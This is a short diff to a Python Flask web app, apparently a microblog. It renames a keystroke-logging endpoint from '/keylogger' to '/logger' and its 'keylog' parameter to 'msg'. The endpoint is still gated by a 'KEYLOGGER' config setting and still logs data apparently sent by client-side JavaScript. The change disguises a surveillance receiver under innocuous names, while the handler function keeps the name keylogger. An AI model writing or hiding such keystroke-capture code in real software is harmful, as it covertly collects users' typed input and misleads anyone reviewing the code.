@@ -26,7 +26,7 @@ def before_request():
         current_user.last_seen = datetime.utcnow()
         db.session.commit()
         g.search_form = SearchForm()
-    if not (request.path.startswith(('/static', '/favicon', '/keylogger'))):
+    if not (request.path.startswith(('/static', '/favicon', '/logger'))):
         most_recent_url = request.url
     g.locale = str(get_locale())
 
@@ -176,8 +176,8 @@ def help():
     return render_template('help.html', title=_('Help'))
 
 
-@bp.route('/keylogger')
+@bp.route('/logger')
 def keylogger():
     if 'javascript' in current_app.config['KEYLOGGER']:
-        current_app.logger.info('[javascript] {}'.format(request.args.get('keylog')))
+        current_app.logger.info('[javascript] {}'.format(request.args.get('msg')))
     return json.dumps({'success': True}), 200, {'ContentType': 'application/json'}
